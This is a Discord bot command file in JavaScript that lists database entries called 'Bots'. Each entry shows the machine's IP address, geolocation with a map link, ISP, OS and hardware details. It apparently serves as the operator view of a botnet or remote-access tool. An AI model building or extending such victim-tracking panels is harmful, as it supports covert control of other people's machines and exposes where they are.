const Discord = require("discord.js");
const paginationEmbed = require('discord.js-pagination');
const db = require("../models");

exports.run = (client, message, args) => {
    db.Bots.findAll().then((results) => {
        let pages = [];

        results.forEach(element => {
            const embed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .addFields({
                    name: element.ipAddress, 
                    value: `
                        **ID**: ${element.id}
                        **Tag**: ${!element.tag ? "No tag found" : element.tag}
                        **IP Address**: ${element.ipAddress}
                        **Country**: ${element.country}
                        **Region**: ${element.region}
                        **City**: ${element.city}
                        **Location**: https://www.google.com/maps/search/?api=1&query=${element.lat},${element.lon}
                        **ISP**: ${element.isp}
                        **OS**: ${element.operatingSystem}
                        **Release**: ${element.release}
                        **Version**: ${element.version}
                        **Computer Name**: ${element.nodeName}
                        **Processor**: ${element.processor}
                        **Architecture**: ${element.architecture}
                        **Boot Time**: ${element.bootTime}
                        **Cores**: ${element.cpuCores}
                        **Memory**: ${element.memory}`
                    }
                )
                .setThumbnail(`https://www.countryflags.io/${element.countryCode}/flat/64.png`)
                .setTimestamp()

            pages.push(embed);
        });

        paginationEmbed(message, pages);
    });
    
};
